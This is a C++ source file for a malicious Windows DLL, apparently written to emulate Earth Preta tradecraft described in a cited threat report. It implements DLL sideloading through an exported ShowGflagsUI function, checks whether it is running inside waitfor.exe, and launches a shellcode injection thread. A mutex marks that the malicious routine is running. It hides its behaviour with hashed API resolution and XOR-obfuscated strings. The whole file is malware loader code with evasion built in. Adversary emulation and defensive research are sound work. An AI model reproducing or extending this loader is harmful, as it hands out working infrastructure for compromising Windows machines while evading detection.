#include "handler.hpp"
#include "handler_util.hpp"
#include "gflagsui_util.hpp"

#define MUTEX_NAME L"Global\\1247893689173278"

// Returns true if the loading process is waitfor.exe, false otherwise.
BOOL InWaitforProcess() {
    GetModuleFileNameW_t fp_GetModuleFileNameW = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), GetModuleFileNameW);
    if (!fp_GetModuleFileNameW) {
        return FALSE;
    }

    wchar_t buf[MAX_PATH];
    DWORD result = fp_GetModuleFileNameW(NULL, buf, MAX_PATH);
    if (!result) {
        return FALSE;
    }

    return _wcsicmp(buf, XorStringW(L"C:\\Windows\\System32\\waitfor.exe")) == 0;
}

/*
 * DllMain:
 *      About:
 *          If loaded by waitfor.exe, will create a thread to run the shellcode
 *          payload injection routine. Otherwise, simply returns.
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch(fdwReason) {
        case DLL_PROCESS_ATTACH:
            if (InWaitforProcess()) {
                CreateThread_t fp_CreateThread = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), CreateThread);
                if (!fp_CreateThread) {
                    return FALSE;
                }

                // Create mutex to indicate that the malicious routine is running
                DWORD result = EnsureSingleton(XorStringW(MUTEX_NAME), true);
                if (result != ERROR_SUCCESS) {
                    ExitProcess(result);
                }

                HANDLE h_thread = fp_CreateThread(
                    NULL,
                    0,
                    (LPTHREAD_START_ROUTINE)RunPayload,
                    NULL,
                    0,
                    NULL
                );
                if (h_thread == NULL) {
                    return FALSE;
                }
            }
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

__declspec(dllexport) void
ShowGflagsUI(void* a, void* b, void* c, void* d) {
    // Check if mutex exists without creating it - this allows us
    // to determine if the malicious routine is currently running
    // in another process
    DWORD result = EnsureSingleton(XorStringW(MUTEX_NAME), false);
    if (result != ERROR_SUCCESS) {
        ExitProcess(result);
    }
    Handler();
    ExitProcess(0);
}
